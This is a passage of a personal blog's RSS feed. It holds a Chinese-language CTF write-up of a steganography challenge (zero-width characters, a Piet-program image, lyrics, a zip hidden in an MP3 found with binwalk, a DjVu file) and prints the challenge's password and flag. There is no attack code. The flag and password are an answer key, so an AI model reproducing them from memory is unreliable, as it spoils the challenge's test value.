&#39;h\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\
u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\uFEFF\uFEFF\u200D\u200B\uFEFF\u200D\uFE
FF\u200B\u200C\u200E\u200F\u200B\uFEFF\u200F\u200D\u200B\u200D\uFEFF\uFEFF\u200B\
u200F\uFEFF\u200D\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFE
FF\u200E\u200B\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\
u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFE
FF\u200E\u200C\u200B\u200F\uFEFF\uFEFF\u200B\uFEFF\u200C\u200E\u200B\u200C\u200E\
u200C\u200B\uFEFF\u200F\u200D\u200B\u200F\u200E\u200E\u200Eello&#39;;
// 使用zero-width-lib的decode方法来解密字符串
const decoded = z.decode(encodedString);
console.log(decoded);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;2逮虾户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2逮虾户&#34;&gt;#&lt;/a&gt; 2. 逮虾户&lt;/h4&gt;
&lt;p&gt;附件一个 dmg 文件是 moc 系统磁盘文件，7z 直接提取，一个需要密码的压缩包，一个 png 文件，密码应该就在 png 文件里，然后用 binwalk,foremost,stegsolve,zsteg，好多工具都找不到隐写内容，后来在学长的提示下是 piet 编程语言，然后下载 npiet 执行文件得到密码&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png&#34; alt=&#34;image-1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开 7z 文件，是一个逮虾户歌曲，尝试 MP3 隐写的解题方法，一无所获，再次请教学长，&lt;br&gt;
信息在歌词里，想着把歌词提取出来，最后利用 elisa 播放器找到 passward&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png&#34; alt=&#34;image-2.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;诶？长得也不像 flag，然后学长提醒有一个 zip 文件没找到，用 binwalk 处理那个 MP3 文件，提取到 zip 文件&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png&#34; alt=&#34;image-3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开之后是一个 jdvu 文件，记事本打不开，百度，要下载 windjview，然后就可以看到 flag&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png&#34; alt=&#34;image-4.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Hgame&amp;#123;d3j45_i_kn0w&amp;#125;&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/03/My-New-Post/</guid>
            <title>Welcome to Fc04dB&#39;s BLOG</title>
            <link>http://example.com/2024/04/03/My-New-Post/</link>
            <pubDate>Wed, 03 Apr 2024 20:29:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;WELCOME&#34;&gt;&lt;a href=&#34;#WELCOME&#34; class=&#34;headerlink&#34; title=&#34;WELCOME!!!!!&#34;&gt;&lt;/a&gt;WELCOME!!!!!&lt;/h1&gt; ]]></description>
        </item>
    </channel>
</rss>
